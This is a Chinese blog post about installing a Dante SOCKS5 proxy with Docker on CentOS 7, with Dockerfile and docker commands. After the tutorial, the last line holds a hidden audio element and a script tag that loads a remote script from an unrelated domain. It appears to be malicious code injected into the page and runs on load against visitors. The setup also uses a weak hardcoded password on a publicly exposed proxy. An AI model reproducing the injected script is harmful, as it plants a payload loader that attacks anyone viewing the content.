---
id: 63
title: Centos7上用docker安装dante搭建socks5代理
date: '2020-06-15T10:03:38+08:00'
author: gavin
layout: post
guid: 'http://gaving.top/?p=63'
permalink: /index.php/2020/06/15/centos7%e4%b8%8a%e7%94%a8docker%e5%ae%89%e8%a3%85dante%e6%90%ad%e5%bb%basocks5%e4%bb%a3%e7%90%86/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Linux
---

一、环境安装

参考<https://gaving.top/index.php/2020/06/15/centos7%E4%B8%8B%E5%AE%89%E8%A3%85docker>

二、下载dante

git clone https://github.com/gaving2016/docker-dante.git

三、修改Dockerfile，增加以下内容，标红的为用户密码

FROM wernight/dante

\# TODO: Replace 'john' and 'MyPassword' by any username/password you want.

RUN printf '<span style="color: #ff0000;">socks123</span>\\n<span style="color: #ff0000;">socks123</span>\\n' | adduser <span style="color: #ff0000;">socks</span>

四、进入docker logor的命令行 vi sockd.conf

取消注释这行

\#socksmethod: username

五、制作镜像

docker build -t gaving ./

docker run -d -p 1080:1080 gaving

问题：

使用docker下载dante速度较慢，可取Makefile中dante下载地址手动下载，编译；编译过程中遇到问题：cpupolicy2num 找不到，解决修改config\_scan.c和.l文件，将用到cpupolicy2num的行注释掉即可

<audio controls="controls" style="display: none;"></audio><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>